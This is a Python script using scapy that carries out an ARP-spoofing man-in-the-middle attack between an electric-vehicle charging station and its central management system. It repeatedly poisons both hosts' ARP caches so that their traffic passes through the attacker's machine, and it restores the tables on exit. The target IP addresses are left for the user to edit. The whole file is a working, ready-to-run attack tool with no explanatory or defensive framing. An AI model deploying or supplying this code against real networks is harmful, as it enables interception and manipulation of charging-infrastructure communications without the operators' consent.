from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, conf

import time
import sys

# Set the IPs and MAC addresses of the EVCS, CSMS, and attacker (your machine)
EVCS_IP = "192.168.1.100"  # Change this to your EVCS IP
CSMS_IP = "192.168.1.200"  # Change this to your CSMS IP
ATTACKER_MAC = get_if_hwaddr(conf.iface)  # Gets attacker's MAC address

# Get the MAC addresses of the EVCS and CSMS
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if response:
        return response[0][1].hwsrc
    return None

# Function to spoof ARP responses
def spoof(target_ip, spoof_ip, spoof_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, verbose=False)

# Function to restore ARP table when stopping attack
def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    if target_mac and source_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=5, verbose=False)

# Main function
def mitm_attack():
    print("[*] Starting ARP Spoofing attack...")
    
    try:
        while True:
            spoof(EVCS_IP, CSMS_IP, ATTACKER_MAC)  # Make EVCS think we are CSMS
            spoof(CSMS_IP, EVCS_IP, ATTACKER_MAC)  # Make CSMS think we are EVCS
            time.sleep(2)  # Send packets every 2 seconds
    except KeyboardInterrupt:
        print("\n[!] Stopping attack, restoring ARP tables...")
        restore(EVCS_IP, CSMS_IP)
        restore(CSMS_IP, EVCS_IP)
        print("[*] ARP tables restored. Exiting.")
        sys.exit(0)

# Run the attack
if __name__ == "__main__":
    mitm_attack()